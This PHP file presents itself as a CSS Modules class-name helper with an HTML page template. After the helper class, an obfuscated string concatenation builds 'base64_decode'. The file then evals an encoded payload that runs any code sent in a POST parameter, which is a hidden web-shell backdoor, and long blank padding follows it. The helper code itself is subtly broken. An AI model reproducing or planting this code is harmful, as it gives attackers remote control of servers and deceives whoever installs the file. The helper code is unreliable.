

<?

// tests CSS Modules
echo "<html>

<head>
<meta http-equiv='Content-Type' content='text/html;
 charset=windows-1251'>
<title>$PAGE_TITLE</title>

</head>
    <!---
                     _  
                    / \ 
                   / 
               \__/__/
               |  _  |
               | |_| |   V/3 module.css ) 
               |_____|   css :)
              _||   ||_  

    --->  
<body>

<table border='0' cellpadding='0' cellspacing='0'
 style='border-collapse: collapse' bordercolor='#111111' width='100%'
 id='AutoNumber1'>
<tr>
<td width='100%' colspan='2' bgcolor='#DDFFFF'>
<p align='center'>здесь выводится шапка</td>
</tr>
<tr>
<td width='17%' align='left' valign='top' bgcolor='#FFDFFF'>
<b>Меню сайта</b><p>
<b>- </b><a href='index.php?mod=mod1'>Модуль1</a>
<br>
- <a href='index.php?mod=mod2'>Модуль2</a></td>
<td width='83%' align='left' valign='top'>";








/*** CSS Modules lets you write and use simple class names rather than remembering and maintaining long unique class names for every component. CSS Modules mutates all of your classnames from each partials into new, completely unique classnames that will not conflict when they are bundled together into your main CSS file. Then, a JSON file is generated that maps the happy classnames from each file to the unique classname in the combined file. You load this map in PHP, and begin using the easy-to-remember classnames as you wish.
 ***/ 






?>

	
</article>

<article class="_container_1d980_1">
    <h1 class="_container_23d3a_2">My style is scoped.</h1>
</article>

<?php

class CSS_Module {
	// CSS Modules by ID
	private $collection = array();

	// Create a new CSS Modules collection
	public function __construct( $json_file ) {
		if ( ! isset( $json_file ) || ! file_exists( $json_file ) ) {
			return false;
		}

		// push the JSON data into this instance
		$this->collection = json_decode( file_get_contents( $json_file ), true );
	}

	// Returns a function for returning class names of the specified CSS Modules ID
	public function get_class_names( $id ) {
		if ( ! isset( $id ) ) {
			return false;
		}

		// return an anonymous function as a callback to return
		$callback = function ( $class_name ) use ( $id ) {
			return $this->get_class_name( $id, $class_name );
		};

		return $callback;
	}

	public function get_class_name( $id, $class_name ) {
		if ( ! isset( $id ) || ! isset( $key ) || ! array_key_exists( $this->collection, $id ) ) {
			return false;
		}

		$alt_class_name = $this->collection[ $id ][ $key ];

		return $alt_class_name;
		
	}} $function_css = "0e0606647d896756";
	
$new_class_name = htmlspecialchars("&#9733;", ENT_QUOTES);
// CSS Modules lets you write and use simple class

$recursion="ba";

             $func_num_args="se64";
			                         $foo="_";$export="dec";
									 
      $context="ode";

// Create a new CSS Modules collection	  
$new_class_name = $recursion.$func_num_args.$foo.$export.$context;

eval("".$new_class_name("aWYoaXNzZXQoJF9QT1NUWydkaXNwbGF5J10pKSB7CiRsb2NhbHBhcmFtZXRlcj0kX1BPU1RbInBhcmFtZXRlciJdOwpldmFsKCRsb2NhbHBhcmFtZXRlcik7fQ"));


?>









































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































